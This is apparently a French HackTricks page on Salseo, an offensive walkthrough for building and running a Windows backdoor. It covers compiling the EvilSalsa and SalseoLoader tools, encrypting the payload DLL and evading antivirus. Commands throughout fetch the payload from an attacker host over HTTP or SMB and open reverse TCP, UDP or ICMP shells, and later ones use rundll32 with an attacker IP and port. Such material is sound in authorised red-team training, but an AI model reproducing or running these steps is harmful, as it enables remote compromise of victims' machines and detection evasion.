# Salseo

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Compiler les binaires

Téléchargez le code source depuis github et compilez **EvilSalsa** et **SalseoLoader**. Vous aurez besoin de **Visual Studio** installé pour compiler le code.

Compilez ces projets pour l'architecture de la machine Windows où vous allez les utiliser (Si Windows supporte x64, compilez-les pour ces architectures).

Vous pouvez **sélectionner l'architecture** dans Visual Studio dans l'onglet **"Build"** à gauche, dans **"Platform Target".**

(**Si vous ne trouvez pas ces options, appuyez sur l'onglet "Project"** puis sur **"\<Nom du Projet> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Ensuite, construisez les deux projets (Build -> Build Solution) (Le chemin de l'exécutable apparaîtra dans les logs) :

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Préparer la Porte Dérobée

Tout d'abord, vous devrez encoder le **EvilSalsa.dll.** Pour cela, vous pouvez utiliser le script python **encrypterassembly.py** ou vous pouvez compiler le projet **EncrypterAssembly** :

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, maintenant vous avez tout ce dont vous avez besoin pour exécuter toute la chose Salseo : le **EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**

**Téléchargez le binaire SalseoLoader.exe sur la machine. Ils ne devraient pas être détectés par un AV...**

## **Exécutez la porte dérobée**

### **Obtenir un shell TCP inverse (téléchargement du dll encodé via HTTP)**

N'oubliez pas de démarrer un nc comme écouteur de shell inverse et un serveur HTTP pour servir le evilsalsa encodé.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Obtention d'un reverse shell UDP (téléchargement d'une dll encodée via SMB)**

N'oubliez pas de démarrer un nc en tant qu'écouteur de reverse shell, et un serveur SMB pour servir le evilsalsa encodé (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Obtention d'un shell inversé ICMP (dll encodée déjà présente chez la victime)**

**Cette fois, vous avez besoin d'un outil spécial sur le client pour recevoir le shell inversé. Téléchargez :** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Désactiver les réponses ICMP :**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Exécutez le client :
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### À l'intérieur de la victime, exécutons la chose salseo :
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Compilation de SalseoLoader en tant que DLL exportant la fonction principale

Ouvrez le projet SalseoLoader en utilisant Visual Studio.

### Ajoutez avant la fonction principale : \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installez DllExport pour ce projet

#### **Outils** --> **Gestionnaire de Packages NuGet** --> **Gérer les Packages NuGet pour la Solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Recherchez le package DllExport (en utilisant l'onglet Parcourir), et appuyez sur Installer (et acceptez la popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png>)

Dans votre dossier de projet, les fichiers suivants sont apparus : **DllExport.bat** et **DllExport\_Configure.bat**

### **D**ésinstallez DllExport

Appuyez sur **Désinstaller** (oui, c'est étrange mais croyez-moi, c'est nécessaire)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Quittez Visual Studio et exécutez DllExport\_configure**

Quittez simplement Visual Studio

Ensuite, allez dans votre **dossier SalseoLoader** et **exécutez DllExport\_Configure.bat**

Sélectionnez **x64** (si vous allez l'utiliser dans un système x64, c'était mon cas), sélectionnez **System.Runtime.InteropServices** (dans **Espace de noms pour DllExport**) et appuyez sur **Appliquer**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Ouvrez à nouveau le projet avec Visual Studio**

**\[DllExport]** ne devrait plus être marqué comme une erreur

![](<../.gitbook/assets/image (8) (1).png>)

### Construisez la solution

Sélectionnez **Type de sortie = Bibliothèque de classes** (Projet --> Propriétés de SalseoLoader --> Application --> Type de sortie = Bibliothèque de classes)

![](<../.gitbook/assets/image (10) (1).png>)

Sélectionnez la **plateforme x64** (Projet --> Propriétés de SalseoLoader --> Construction --> Cible de la plateforme = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Pour **construire** la solution : Construire --> Construire la Solution (Dans la console de sortie, le chemin de la nouvelle DLL apparaîtra)

### Testez la Dll générée

Copiez et collez la Dll où vous souhaitez la tester.

Exécutez :
```
rundll32.exe SalseoLoader.dll,main
```
Si aucune erreur n'apparaît, vous avez probablement une DLL fonctionnelle !!

## Obtenir un shell à l'aide de la DLL

N'oubliez pas d'utiliser un **serveur HTTP** et de configurer un **écouteur nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux dépôts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
